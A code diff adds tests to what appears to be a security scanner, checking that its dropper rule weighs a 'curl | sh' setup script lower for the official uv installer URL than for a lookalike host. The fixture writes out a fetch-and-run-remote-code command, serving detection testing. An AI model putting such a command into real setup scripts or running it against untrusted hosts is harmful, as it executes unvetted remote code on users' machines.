@@ -13639,3 +13639,32 @@ class TestContentHashedBundlesAreBuildOutput:
 
         assert not is_generated_artefact("src/handlers.js")
         assert not is_generated_artefact("src/v2.handlers.js")
+
+
+class TestAnOfficialInstallerIsSetup:
+    @staticmethod
+    def _dropper(tmp_path, url: str) -> list:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "scripts").mkdir()
+        (tmp_path / "scripts" / "setup.ts").write_text(
+            "import { spawnSync } from 'node:child_process';\n"
+            f"spawnSync('sh', ['-c', 'curl -LsSf {url} | sh'], {{ stdio: 'inherit' }});\n",
+            encoding="utf-8",
+        )
+        return [
+            f
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if "DROPPER" in f.rule_id
+        ]
+
+    def test_the_uv_installer_is_below_the_gate(self, tmp_path) -> None:
+        found = self._dropper(tmp_path, "https://astral.sh/uv/install.sh")
+        assert all(f.severity <= Severity.MEDIUM for f in found)
+
+    def test_any_other_host_keeps_its_weight(self, tmp_path) -> None:
+        found = self._dropper(tmp_path, "https://astral-sh.invalid/uv/install.sh")
+        assert any(f.severity >= Severity.HIGH for f in found)
